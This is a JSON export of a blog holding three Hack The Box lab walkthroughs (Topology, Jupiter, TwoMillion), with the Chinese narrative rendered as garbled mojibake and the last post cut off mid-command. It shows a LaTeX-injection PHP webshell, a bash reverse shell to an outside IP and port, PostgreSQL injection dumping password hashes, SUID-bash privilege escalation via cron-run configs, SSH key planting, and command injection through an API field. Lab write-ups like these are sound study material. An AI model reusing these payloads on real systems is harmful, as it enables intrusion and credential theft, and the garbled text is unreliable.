{"meta":{"title":"Someb0dy's blog","subtitle":"","description":"Always Be Hungry,Be Foolish","author":"Someb0dy","url":"someb0dy.github.io","root":"/"},"pages":[{"title":"categories","date":"2023-06-14T06:17:42.558Z","updated":"2023-06-14T06:17:42.558Z","comments":true,"path":"categories/index.html","permalink":"someb0dy.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2023-06-14T02:34:02.537Z","updated":"2023-06-14T02:34:02.536Z","comments":false,"path":"tags/index.html","permalink":"someb0dy.github.io/tags/index.html","excerpt":"","text":"title: tagsdate: 2023-06-14 10:32:56"}],"posts":[{"title":"Topology","slug":"Topology","date":"2023-06-14T06:40:44.058Z","updated":"2023-06-14T06:41:47.036Z","comments":true,"path":"2023/06/14/Topology/","link":"","permalink":"someb0dy.github.io/2023/06/14/Topology/","excerpt":"","text":"Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# nmap -A 10.10.11.217 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 22:39 EDT Verbosity Increased to 1. Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE: Active NSE Script Threads: 1 (1 waiting) NSE Timing: About 93.75% done; ETC: 22:40 (0:00:00 remaining) Verbosity Increased to 2. Completed NSE at 22:40, 7.32s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:40 Completed NSE at 22:40, 0.00s elapsed Nmap scan report for localhost (10.10.11.217) Host is up (0.18s latency). Scanned at 2023-06-11 22:39:04 EDT for 73s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA) | 256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA) |_ 256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Miskatonic University | Topology Group |_http-server-header: Apache/2.4.41 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: ç»å…¸22 å’Œ80 ç«¯å£ image.png æ·»åŠ &#x2F;etc&#x2F;hostsæ–‡ä»¶ image.png image.png ç½‘é¡µä¸Šå‘ç°åˆ«çš„å­åŸŸå image.png vhost çˆ†ç ´â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/hacktheboxtools/machine/topology] â””â”€# gobuster vhost -u http://topology.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 è¿™é‡Œçˆ†ç ´åˆ°äº†ä¸€ä¸ªdev.topology.htbçš„åŸŸå latex.topology.htb image.png è¿™ä¸ªåŸŸåä¸‹é¢çš„åº”ç”¨å¯ä»¥åˆ©ç”¨laTexè¡¨è¾¾å¼ç”Ÿæˆpdfæ–‡ä»¶ æ¯”å¦‚è¾“å…¥ \\frac{x+5}{y-3} image.png image.png å°±ç”Ÿæˆäº†å¯¹åº”çš„pdfå›¾ç‰‡ï¼Œèµ·åˆå¾ˆæ‡µé€¼ä¸çŸ¥é“è¯¥æ€ä¹ˆåš åæ¥æœç€æœç€çœ‹åˆ°äº† Refer-HackTrick:https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injectionRefer-github:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injectionå­˜åœ¨laTexè¡¨è¾¾å¼æ³¨å…¥ è¯•è¯•æœ€ç®€å•çš„æ–‡ä»¶åŒ…å« image.png image.png å‘ç°è¢«banäº† é­ç­–gptè·å–latexè¯­æ³• image.png å‘ç° \\begin{filecontents}{myfile.txt} Hello, World! \\end{filecontents} è¿™ä¸ªè¯­æ³•å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œè¯¥ç«™ç‚¹åˆæ˜¯phpå†™çš„å°è¯•å†™ä¸€ä¸ªé©¬ \\begin{filecontents}{someb0dy.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents} urlç¼–ç  %5Cbegin%7Bfilecontents%7D%7Bsomeb0dy.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%7D image.png image.png ä½†æ˜¯å‘ç°å¥½åƒæ²¡æœ‰å†™å…¥æˆåŠŸ ï¼Œå‘œå‘œå†™äº†å¥½ä¹…å†™ä¸è¿›å»-_-ï¼Œç»§ç»­é­ç­– image.png ä¿®æ”¹åçš„webshell\\begin{filecontents*}{someb0dy1.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents*} urlç¼–ç  %5Cbegin%7Bfilecontents%2A%7D%7Bsomeb0dy1.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%2A%7D image.png ç»ˆäºå†™è¿›å»äº†,å†™äº†ä¸€å¤©çš„webshell - -æœäº†!!!è€6 image.png åå¼¹shell image.png bash -i &gt;&amp; /dev/tcp/10.10.16.8/4444 0&gt;&amp;1 image.png æ‹¿åˆ°äº†ä¸€ä¸ªwww-dataç”¨æˆ·æƒé™çš„shell &#x2F;var&#x2F;www&#x2F;dev&#x2F;.htpasswdè¿™é‡Œçœ‹ç€åƒä¸€ä¸ªå¯†ç æ–‡ä»¶ image.png vdaisley:$apr1$1ONUB&#x2F;S2$58eeNVirnRDB5zAIbIxTY0å°è¯•è§£å¯† image.png image.png username password vdaisley calculus20 dev.topology.htb image.png image.png](https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572220412-bb26728a-5689-43df-bb0b-0c3c2d188c98.png#averageHue=%23f9f9f9&clientId=u4ea9d6a6-ecf1-4&from=paste&height=714&id=u395b224b&originHeight=982&originWidth=1792&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=113268&status=done&style=none&taskId=ufe8257e8-96ae-43b8-81c0-7c9a1670cb2&title=&width=1303.2727272727273)![image.png å°è¯•ssh æˆåŠŸç™»å½• Root image.png å¯ä»¥çœ‹åˆ°find &#x2F;opt&#x2F;gunplot -name *.plt -exec gunplot {}è¿™æ¡å‘½ä»¤ æ„æ€å°±æ˜¯åœ¨&#x2F;opt&#x2F;gunplotè¿™ä¸ªç›®å½•ä¸‹æœç´¢ *.pltçš„æ–‡ä»¶ç„¶åä½œä¸ºgunplotçš„å‚æ•°æ‰§è¡ŒRefer:http://www.gnuplot.info/docs_4.2&#x2F;node327.html image.png system â€œå‘½ä»¤â€ è¿™æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤ -bash-5.0$ echo &quot;system &#39;cp /bin/bash /tmp/someb0dy;chmod u+s /tmp/someb0dy&#39;&quot;&gt;someb0dy.plt -bash-5.0$ cp someb0dy.plt /opt/gnuplot/someb0dy.plt -bash-5.0$ ./someb0dy -p someb0dy-5.0# whaomi root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"}]},{"title":"Jupiter","slug":"Jupiter","date":"2023-06-14T05:41:58.494Z","updated":"2023-06-14T06:12:14.518Z","comments":true,"path":"2023/06/14/Jupiter/","link":"","permalink":"someb0dy.github.io/2023/06/14/Jupiter/","excerpt":"","text":"Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/hacktheboxtools] â””â”€# nmap -A 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 11:21 EDT Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 98.94% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Nmap scan report for 10.10.11.216 Host is up (0.22s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=6/5%OT=22%CT=1%CU=30597%PV=Y%DS=2%DC=T%G=Y%TM=647DFDB9 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=B)SEQ(SP=10 OS:1%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O3 OS:=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 270.35 ms 10.10.16.1 2 176.97 ms 10.10.11.216 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds å¸¸è§çš„ä¸¤ä¸ªç«¯å£22 å’Œ 80ç«¯å£ image.png æ·»åŠ  &#x2F;etc&#x2F;hosts10.10.11.216 jupiter.htb ä¸»åŸŸå image.png æ ¹åŸŸåæ²¡å•¥åŠŸèƒ½ç‚¹ï¼Œæš‚æ—¶çœ‹ä¸Šå»ï¼Œvhost ç¢°æ’çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/hacktheboxtools] â””â”€# gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://jupiter.htb [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.3 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/06/05 11:25:42 Starting gobuster in VHOST enumeration mode =============================================================== Found: kiosk.jupiter.htb Status: 200 [Size: 34390] Progress: 114441 / 114442 (100.00%)=============================================================== 2023/06/05 11:41:33 Finished =============================================================== kiosk.jupiter.htbæœ‰ä¸€ä¸ªkiosk.jupiter.htbçš„åŸŸåï¼ŒåŠ å…¥åˆ°hostsæ–‡ä»¶ä¸­ image.png æ˜¯ä¸€ä¸ªgrafanaçš„åº”ç”¨ image.png bpçœ‹åˆ°å†å²è®°å½•ä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªåŒ… image.png è¿™é‡Œèƒ½æ§åˆ¶sqlè¯­å¥ image.png è¿™é‡Œèƒ½çœ‹åˆ°æ•°æ®åº“çš„ç±»å‹æ˜¯PostgreSql ä¸Šhacktrickçœ‹çœ‹ç›¸å…³æ³¨å…¥æ‰‹æ³• Refer:https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql postgreSqlæŸ¥çœ‹æ•°æ®åº“SELECT datname FROM pg_database; image.png postgres moon_namesdb template1 template0 ReadcredentialsSELECT usename, passwd from pg_shadow; image.png username passwd postgres Null grafana_viewer SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w&#x3D;&#x3D;$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss&#x3D;:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY&#x3D; RCE image.png image.png image.png å°è¯•åå¼¹shell image.png image.png shell!!!! ^-^ ä¿¡æ¯æ”¶é›†linpeasä¸Šlinpeas æ”¶é›†ä¸€ä¸‹ä¿¡æ¯ image.png è·Ÿç”¨æˆ·æœ‰å…³ç³»çš„ä¿¡æ¯ pspy image.png ä¸€å †çš„åå¼¹shell hhhh åŒæ—¶æ‰“çš„äººå¤ªå¤šäº† junoè¿è¡Œçš„è¿›ç¨‹ image.png ç­‰ç€ç­‰ç€å‘ç°äº†uid&#x3D;1000(juno)è¿è¡Œäº†ä¸€ä¸ªè„šæœ¬ shadow-simulation.sh (ä¼°è®¡æ˜¯ç”¨æ¥æ¨¡æ‹Ÿç½‘ç»œç”¨çš„)è€Œä¸”ä¼°è®¡æ˜¯å®šæ—¶ä»»åŠ¡ ç„¶åç´§æ¥ç€ åˆ é™¤äº† &#x2F;dev&#x2F;shm&#x2F;shadow.dataç„¶åé€šè¿‡shadow å‘½ä»¤ åŠ ä¸Š&#x2F;dev&#x2F;shm&#x2F;network-simulation.ymlä½œä¸ºå‚æ•°æ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹é…ç½®æ–‡ä»¶ image.png network-simulation.yml general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s è¿™ä¸ªé…ç½®æ–‡ä»¶çœ‹èµ·æ¥å°±åƒæ˜¯ï¼ŒæœåŠ¡ç«¯å¯åŠ¨ä¸€ä¸ªå¼€åœ¨ 80ç«¯å£webæœåŠ¡ï¼Œç„¶åå®¢æˆ·ç«¯å»è¯·æ±‚è¿™ä¸ªwebæœåŠ¡path çš„å‚æ•°çš„ ä½ç½®æ„Ÿè§‰åƒæ˜¯ æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„args è‡ªç„¶å°±æ˜¯å‚æ•° å°è¯•æ‰§è¡Œchmod +s &#x2F;bin&#x2F;bash çš„å‘½ä»¤ ç»™bashå¸¦ä¸Šsuid general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/someb0dy/bash start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/someb0dy/bash start_time: 5s ç„¶åä¸Šä¼ åˆ°é¶æœºçš„&#x2F;dev&#x2F;shm&#x2F;ç›®å½•ä¸‹ï¼Œå€¼å¾—è¯´ä¸€ä¸‹çš„æ˜¯ï¼Œè¿™ä¸ªç›®å½•å­˜å‚¨çš„å†…å®¹å…¶å®æ˜¯å­˜å‚¨åœ¨å†…å­˜å½“ä¸­çš„ æˆ‘å…ˆæŠŠå†…å®¹ä¸Šä¼ åˆ°&#x2F;tmp&#x2F;someb0dyç›®å½•ä¸‹ç„¶åå†é€šè¿‡cp &#x2F;tmp&#x2F;someb0dy&#x2F;network-simulation.yml &#x2F;dev&#x2F;shm&#x2F; è¦†ç›–åŸæœ¬çš„network-simulation.ymlè®°å¾—ç»™&#x2F;tmp&#x2F;someb0dyé™„ä¸Š 777çš„æƒé™ï¼Œä¸ç„¶junoç”¨æˆ·æ²¡æœ‰æƒé™å†™å…¥åˆ° è¿™ä¸ªæ–‡ä»¶å¤¹ image.png ç„¶ååœ¨&#x2F;tmp&#x2F;someb0dyä¸‹ è¿è¡Œ.&#x2F;bash -p ,æˆåŠŸå˜æˆjuno æƒé™ æ¥åˆ°&#x2F;home&#x2F;junoæŸ¥çœ‹é‚£ä¸ªè„šæœ¬ä¹Ÿå¯ä»¥ç¡®è®¤ bash-5.1$ cat shadow-simulation.sh cat shadow-simulation.sh #!/bin/bash cd /dev/shm rm -rf /dev/shm/shadow.data /home/juno/.local/bin/shadow /dev/shm/*.yml cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/ ssh å…¬é’¥å†™å…¥æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥å†™å…¥å…¬é’¥åˆ°.ssh&#x2F;authorized_keys é‡Œé¢å°±å¯ä»¥sshç™»å½•äº† ssh-key -f someb0dy ç”Ÿæˆå…¬ç§é’¥ cp /tmp/someb0dy/someb0dy.pub /home/juno/.ssh/authorized_keys image.png é€šè¿‡ç§é’¥æˆåŠŸç™»å½•,å‘ç°æ˜¯science ç»„ï¼Œæœç´¢ä¸€ä¸‹æ–‡ä»¶ image.png frpä»£ç†æµé‡çœ‹ç€æœ‰è®¸å¤šç«¯å£çš„ï¼Œæ­å»ºä¸€ä¸ªä»£ç†çœ‹çœ‹ image.png è¿™é‡Œä¸ºä»€ä¹ˆè¦æœtokenä¿¡æ¯å‘¢ï¼Œå› ä¸º8888ç«¯å£å¼€äº†ä¸€ä¸ªjupyterçš„æœåŠ¡ image.png ä¸Šé¢ç”¨äº†éƒ½ä¸å¯¹ç„¶åç›´æ¥çœ‹æ—¥å¿—æ–‡ä»¶ä»Šå¤©6.6,é‡Œé¢çš„å¯ä»¥ç”¨äº† image.png ç”¨æ—¥å¿—é‡Œé¢çš„å¯ä»¥ image.png image.png image.png ä¸€æ ·å’Œä¸Šä¸€ä¸ªç”¨æˆ·ä¸€æ ·çš„æ‰‹æ³•ï¼ŒåŒæ ·å†™å…¥.ssh&#x2F;authorized_keys image.png ææƒjovian@jupiter:/usr/local/bin$ sudo -l Matching Defaults entries for jovian on jupiter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack å¯ä»¥ä»¥ç®¡ç†å‘˜æ‰§è¡Œæƒé™æ‰§è¡Œè¿™ä¸ª**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sattrack** image.png æˆ‘ä»¬ç›´æ¥è¿è¡Œè¿™ä¸ªä¸œè¥¿ï¼Œè¾“å‡ºäº†ä¸€äº›æç¤ºä¿¡æ¯æŠŠbashæ¢æˆè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ image.png æ€»ç»“è¿™ä¸ªé¶æœºæ€»ä½“æ¥è¯´éš¾é“ä¸­ç­‰ï¼Œå¸¸è§„çš„æ”¶é›†ä¿¡æ¯æ‰‹æ®µï¼Œæ”¶é›†åˆ°å­åŸŸååï¼Œè¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯ï¼Œé€šè¿‡Postgresql æ‹¿åˆ°Postgresqlç”¨æˆ·çš„shellï¼Œé€šè¿‡æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œæ¥è¿›ä¸€æ­¥è·å–junoçš„æƒé™ï¼Œæ¥ç€é€šè¿‡junoæ‰€åœ¨çš„ç»„ï¼Œè·å–åˆ°joviançš„æƒé™ï¼Œæœ€åæˆåŠŸæ‹¿åˆ°root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"}]},{"title":"TwoMiilion","slug":"TwoMillion","date":"2023-06-14T04:22:31.259Z","updated":"2023-06-14T05:56:06.887Z","comments":true,"path":"2023/06/14/TwoMillion/","link":"","permalink":"someb0dy.github.io/2023/06/14/TwoMillion/","excerpt":"","text":"2023å¹´6æœˆ13æ—¥ 10:05:44 Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# nmap -sCV 10.10.11.221 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 22:03 EDT Nmap scan report for 10.10.11.221 Host is up (0.15s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA) |_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds ç»å…¸ä¸¤ä¸ªç«¯å£22,80 image.png ä¿®æ”¹&#x2F;etc&#x2F;hostsæ–‡ä»¶ image.png image.png æœ‰ç™»å½•ï¼ŒçŒœæµ‹æœ‰æ³¨å†Œ è®¿é—®&#x2F;regiser image.png æ³¨å†Œå‘ç°ä¹Ÿå¤±è´¥äº†ï¼Œéœ€è¦é‚€è¯·ç ï¼Œèµ°æŠ•æ— è·¯çš„æ„Ÿè§‰- - ï¼Œç¿»ç¿»bpå†å²ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç”Ÿæˆcodeç›¸å…³é€»è¾‘çš„. inviteapi.min.js image.png è®¾ç½®è¿‡æ»¤å™¨ image.png è¿™ä¸ªjsæ–‡ä»¶çœ‹èµ·æ¥åƒå’Œé‚€è¯·ç æœ‰å…³ç³»çš„é€»è¾‘ image.png è¿™æ®µä»£ç å…¶å®æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªåå«makeInviteCode çš„å‡½æ•°,æˆ‘ä»¬åœ¨consoleè°ƒç”¨ä¸€ä¸‹ image.png function verifyInviteCode(code) { var formData = { &quot;code&quot;: code }; $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, data: formData, url: &#39;/api/v1/invite/verify&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } function makeInviteCode() { $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, url: &#39;/api/v1/invite/how/to/generate&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } æœ‰ä¸€ä¸ªè·¯ç”± POST /api/v1/invite/how/to/generate HTTP/1.1 Host: 2million.htb Content-Length: 0 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Content-Type: application/json Origin: http://2million.htb Referer: http://2million.htb/invite Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=stdisqd79m2j4qb1f3s9a6f250 Connection: close HTTP/1.1 200 OK Server: nginx Date: Tue, 13 Jun 2023 03:28:53 GMT Content-Type: application/json Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 249 {&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;} image.png ROT13è§£å¯† image.png ä»–è®©æˆ‘ä»¬è¯·æ±‚&#x2F;api&#x2F;v1&#x2F;invite&#x2F;generateè¿™ä¸ªè·¯ç”± image.png base64è§£å¯†ä¸€ä¸‹æ¥ç€å°±è¿›è¡Œæ³¨å†Œä»¥åŠç™»å½•çš„æ“ä½œ ç™»å½•åå°ç™»å½•ä¹‹åæˆ‘ä»¬è¿›å…¥åˆ°äº†ä¸€ä¸ªç±»ä¼¼HTBçš„ç•Œé¢ image.png è¿™é‡Œå¯ä»¥ä¸‹è½½ovpné…ç½®æ–‡ä»¶ä½†æ˜¯è¿æ¥ä¸ä¸Šå» image.png è¿æ¥å‰æŠŠè¿™ä¸ªè§£æçš„åŸŸåè®°å¾—åŠ å…¥åˆ° &#x2F;etc&#x2F;hostsæ–‡ä»¶ image.png &#x2F;api&#x2F;v1æˆ‘ä»¬è·å–è·¯ç”±åˆ—è¡¨ç™»å½•è¿‡åæœ‰æˆæƒäº† image.png å…¶ä¸­æœ‰ä¸€ä¸ªè·¯ç”±settings&#x2F;update æ›´æ–°è®¾ç½® image.png æˆ‘ä»¬ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œå›æ˜¾å‘ç°Invalid content type , å¤±æ•ˆçš„å†…å®¹ç±»å‹æ¢æˆjsonè¯•è¯• image.png image.png æ ¹æ®å›æ˜¾æ“ä½œï¼Œæˆ‘ä»¬å·²ç»æŠŠè‡ªå·±ä¿®æ”¹æˆä¸ºäº†ç®¡ç†å‘˜æƒé™ image.png éªŒè¯ç®¡ç†å‘˜æƒé™æˆåŠŸ image.png é€šè¿‡è¿™ä¸ªè·¯ç”±ç”Ÿæˆäº†ä¸€ä¸ªå¸¦vpnæƒé™çš„ovpné…ç½®æ–‡ä»¶ï¼Œå‰é¢è‡ªå·±ä½¿ç”¨æ™®é€šç”¨æˆ·çš„ovpné…ç½®æ–‡ä»¶å¤±è´¥ ç»“æœè¿™ä¸ªåœ°æ–¹ç”Ÿæˆçš„é…ç½®æ–‡ä»¶è¿˜æ˜¯ç”¨ä¸äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢- - RCEæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹è¿™ä¸ªåœ°æ–¹ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œæ˜¯å¦‚ä½•ç”Ÿæˆçš„å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼ image.png ä»–è¯»å–æˆ‘ä»¬çš„å‚æ•°ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰ä½“ç°ï¼Œæ‰€ä»¥ä¼šä¸ä¼šæ˜¯åˆ©ç”¨ç±»ä¼¼ä¸‹é¢ä»£ç çš„æ¥å®ç°çš„å‘¢ä¸‹é¢çš„ä»£ç åªæ˜¯ä¾‹å­ï¼Œå…·ä½“å®ç°ä¸ä¸€å®šæ˜¯è¿™æ · &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username); æ‰€ä»¥è¿™é‡Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ image.png è¿™æ ·å¥½åƒå¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ é‚£å½“æˆ‘ä»¬å†åŠ ä¸€ä¸ªæ³¨é‡Šç¬¦å·**# å‘¢ï¼Ÿ**åœ¨linuxç³»ç»Ÿä¸­ # è¿™ä¸ªç¬¦å·åé¢çš„å†…å®¹ä¼šå½“ä½œæ³¨é‡Šæ¥è§£é‡Š image.png èŠœæ¹–ï¼ï¼ï¼ &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username+&quot;Paramter&quot;); æ‰€ä»¥ä»–é€»è¾‘ä¼°è®¡æ˜¯è¿™æ ·çš„ç»“æ„ ï¼Œåé¢å­˜åœ¨åˆ«çš„å‚æ•° # æŠŠåé¢çš„å‚æ•°æ³¨é‡Šåå°±æˆåŠŸäº†åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨idåé¢å†åŠ ä¸Šä¸€ä¸ª; ä¹Ÿå¯ä»¥æ‰§è¡Œä»£ç æˆåŠŸ image.png åå¼¹shell image.png æ•°æ®åº“é…ç½®æ–‡ä»¶ image.png username password admin SuperDuperPass123 www-data@2million:~/html$ which python3 which python3 /usr/bin/python3 www-data@2million:~/html$ python3 -c &quot;import 